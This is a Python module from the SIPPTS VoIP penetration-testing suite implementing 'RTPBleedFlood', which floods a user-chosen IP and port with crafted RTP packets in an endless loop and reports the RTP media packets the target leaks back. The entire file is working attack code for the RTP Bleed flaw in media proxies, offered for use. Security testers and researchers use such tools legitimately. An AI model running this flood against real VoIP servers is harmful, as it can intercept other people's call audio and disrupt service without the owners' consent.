#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import fcntl
import os
import sys
from .lib.color import Color
from .lib.logos import Logo


class RTPBleedFlood:
    def __init__(self):
        self.nocolor = ""
        self.ip = ""
        self.port = ""
        self.payload = "0"
        self.verbose = 0
        
        self.run = True

        self.c = Color()


    def stop(self):
        print(self.c.WHITE)
        self.run = False


    def start(self):
        # -nocolor has to be applied before anything is printed, the logo
        # included, or those lines keep their escape codes
        try:
            self.nocolor = int(self.nocolor)
        except (TypeError, ValueError):
            self.nocolor = 0

        if self.nocolor == 1:
            self.c.ansy()

        self.port = int(self.port)
        self.payload = int(self.payload)

        try:
            self.verbose = int(self.verbose)
        except:
            self.verbose = 0

        logo = Logo("rtpbleedflood", self.nocolor)
        logo.print()

        print(f"{self.c.BWHITE}[✓] Target IP: {self.c.YELLOW}{self.ip}")
        print(
            f"{self.c.BWHITE}[✓] Remote port: {self.c.YELLOW}{str(self.port)}"
        )
        print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{self.payload}")
        print(self.c.WHITE)

        print(
            f"{self.c.YELLOW}[+] Sending RTP packets to {self.ip}:{self.port}{self.c.WHITE}"
        )

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(f"{self.c.RED}Failed to create socket")
            print(self.c.WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        host = (str(self.ip), self.port)
        nloop = 0
        count = 1

        while True and self.run == True:
            try:
                nloop += 1
                cloop = hex(nloop)[2:]
                cloop = cloop.zfill(4)
                cpayload = "%s" % hex(0x80 | self.payload & 0x7F)[2:]
                # byte[0] = 0x80 => RTP version 2
                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                # byte[2-3] = Sequence number
                message = "80" + cpayload + cloop + "0000000000000000"
                byte_array = bytearray.fromhex(message)

                if nloop == 65535:
                    nloop = 1

                # Send data
                sock.sendto(byte_array, host)

                try:
                    (msg, addr) = sock.recvfrom(4096)
                    (ipaddr, rport) = host
                    size = len(msg)

                    if size >= 12:
                        # hex() drops the leading zero of a byte below 0x10,
                        # so the fields are read as bytes
                        seq = int.from_bytes(msg[2:4], "big")

                        if self.verbose == 1:
                            print(
                                f"{self.c.WHITE}[{str(count)}] received {str(size)} bytes from target port {str(rport)} with seq number {seq}"
                            )
                        else:
                            print(
                                f"{self.c.WHITE}[{str(count)}] received {str(size)} bytes from target port {str(rport)} with seq number {seq}",
                                end="\r",
                            )
                        count += 1
                except OSError:
                    # No data available (a bare except swallowed Ctrl+C)
                    continue
            except KeyboardInterrupt:
                print(f"{self.c.YELLOW}\nYou pressed Ctrl+C!")
                print(self.c.WHITE)
                self.run = False
            except:
                pass
